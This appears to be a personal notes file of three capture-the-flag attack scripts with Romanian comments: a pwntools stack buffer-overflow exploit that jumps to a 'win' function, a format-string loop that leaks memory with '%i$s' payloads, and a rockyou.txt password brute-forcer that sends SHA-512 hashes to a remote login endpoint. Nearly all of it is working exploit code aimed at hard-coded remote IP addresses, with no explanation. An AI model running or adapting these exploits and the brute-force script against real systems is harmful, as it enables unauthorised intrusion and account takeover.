# madalina
1. script for pwn that contain win

  from pwn import *
  
  conn = remote("34.179.160.33", 31007)
  
  elf = ELF("./main")
  
  # ret gadget pentru stack alignment
  ret = 0x4012ec  # adresa unui simplu `ret` din binar
  
  offset = 120
  payload = b"A" * offset
  payload += p64(ret)       # stack alignment
  payload += p64(0x4011b6)  # wins
  
  conn.sendline(payload)
  conn.interactive()
2. script for pwn that contain a printf(...) without %s
  from pwn import *
  
  for i in range(50,70):
    p = remote("34.179.160.33", 30181)
    p.recvline()
    p.sendline(f'%{i}$s'.encode())
    print(p.recvline().strip())
    p.close()
3. spart parola cu kkt
  import hashlib
  import requests
  
  url="http://34.159.229.13:30593/auth"
  name = '416c6578'
  print(name)
  with open("/usr/share/worlist/rockyou.txt","r",errors='ignore') as f:
      for pw in f:
          pw=pw.strip()
          h=hashlib.sha512(pw.encode()).hexdigest()
          r=requests.get(url,params={"name": name, "passwoed": h})
          if "Invalid password" not in r.text:
              print("PAROLA:",pw)
              print("RASPUNS:",r.text)
              break

